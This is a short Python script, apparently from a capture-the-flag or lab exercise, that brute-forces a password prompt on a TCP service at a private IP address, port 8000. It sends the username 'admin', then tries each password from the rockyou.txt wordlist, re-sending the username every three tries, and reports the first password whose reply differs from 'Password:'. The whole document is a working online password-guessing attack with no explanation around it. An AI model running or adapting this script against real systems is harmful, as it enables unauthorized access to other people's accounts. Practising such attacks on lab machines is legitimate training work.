import socket

def login(s, password):
    try:
        s.send(password.encode())
        res = s.recv(1024).decode().strip()
        print(res)
        if "Password:" != res:
            print(f"[+] Found Password : {password}")
            quit()
    except socket.timeout:
        pass

ip = "10.10.115.68"
port = 8000

cnt = 0
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(1)
s.connect((ip, port))
s.send("admin".encode())
res = s.recv(1024)
print(res.decode())

with open("rockyou.txt", "r", encoding="latin1") as wordlist:
    for line in wordlist.readlines():
        print(line)
        if (cnt == 3):
            s.send("admin".encode())
            res2 = s.recv(1024).decode()
            cnt = 0
        login(s, line.strip())
        cnt += 1